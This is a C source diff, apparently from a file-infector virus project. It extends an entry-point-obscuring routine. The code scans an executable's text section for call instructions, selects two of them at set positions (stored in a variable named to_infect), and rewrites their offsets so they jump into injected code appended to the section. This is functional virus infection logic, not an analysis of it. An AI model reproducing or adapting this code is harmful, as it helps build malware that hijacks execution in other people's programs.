@@ -97,23 +97,58 @@ int		find_text(t_info *info)
 	return (0);
 }
 
+static void	hook_call(t_info *info, int32_t nb)
+{
+	int32_t	new_jmp;
+
+	new_jmp = (int32_t)(info->text_size - (size_t)((size_t)(info->addr_call_to_replace) - (size_t)(info->text_begin)) - 5);
+	new_jmp += (4 *(nb - 1));
+	ft_memcpy(info->addr_call_to_replace + 1, &new_jmp, sizeof(new_jmp));
+}
+
 void		epo_parsing(t_info *info)
 {
 	size_t	i;
+	int32_t	nb_call_detected;
+	int32_t	to_infect[2];
 	uint8_t	c;
 
 	i = 0;
+	nb_call_detected = 0;
 	while (i < info->text_size)
 	{
 		c = *((uint8_t *)(info->text_begin + i));
 		if (c == 0xe8 && i + 4 < info->text_size && (valid_call(info, i + 1) == 0))
+			nb_call_detected++;
+		i++;
+	}
+	if (nb_call_detected < 2)
+	{
+		info->valid_target = 0;
+		return ;
+	}
+	to_infect[0] = nb_call_detected / 4;
+	to_infect[1] = (nb_call_detected * 3) / 4 ;
+
+	i = 0;
+	nb_call_detected = 0;
+	int32_t	nb = 0;
+	while (i < info->text_size && nb_call_detected <= to_infect[1])
+	{
+		c = *((uint8_t *)(info->text_begin + i));
+		if (c == 0xe8 && i + 4 < info->text_size && (valid_call(info, i + 1) == 0))
 		{
-			info->addr_call_to_replace = info->text_begin + i;
-			return ;
+			if ((nb_call_detected == to_infect[0]) || (nb_call_detected == to_infect[1]))
+			{
+				nb++;
+				info->addr_call_to_replace = info->text_begin + i;
+				hook_call(info, nb);
+				patch_end(info, nb);
+			}
+			nb_call_detected++;
 		}
 		i++;
 	}
-	info->valid_target = 0;
 }
 
 void		pe_parsing(t_info *info)
